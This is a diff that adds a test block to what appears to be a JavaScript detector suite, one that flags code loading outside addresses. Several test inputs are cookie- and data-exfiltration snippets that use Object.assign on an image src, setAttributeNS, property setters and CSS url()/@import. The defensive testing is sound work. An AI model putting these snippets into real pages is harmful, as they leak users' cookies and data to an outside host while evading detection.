@@ -163,3 +163,15 @@ test('names spelled from literal pieces in other ways count too (join, concat, a
   has('const set = (o, k, v) => { o[k] = v; }; set(new Image(), "src", "https://" + host + "/?d=" + document.cookie)', 'loads');
   none('const cls = ["a", "b"].join(" "); el.className = cls');
 });
+
+test('other ways to set an address: Object.assign, setAttributeNS, a property\'s setter by name, CSS url() in any string', () => {
+  has('Object.assign(new Image(), { src: "https://" + host + "/?d=" + document.cookie })', 'loads');
+  has('const set = (o, k, v) => Object.assign(o, { [k]: v }); set(img, "src", u)', 'loads');
+  has('a.setAttributeNS(null, "href", "https://" + h + "/?d=" + data)', 'loads');
+  has('b.setAttributeNS(null, "onload", "fetch(1)")', 'hidden');
+  has('Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, "src").set.call(new Image(), u)', 'hidden');
+  has('style.textContent = "@import url(https://" + h + "/?d=" + data + ")"', 'loads');
+  has('style.textContent = `.x { background: url(${u}) }`', 'loads');
+  none('Object.assign(keys, { ArrowLeft: false, space: false }); el.style.background = "url(data:image/png;base64,AAA)"');
+  none('a.setAttributeNS(null, "fill", "#fff")');
+});
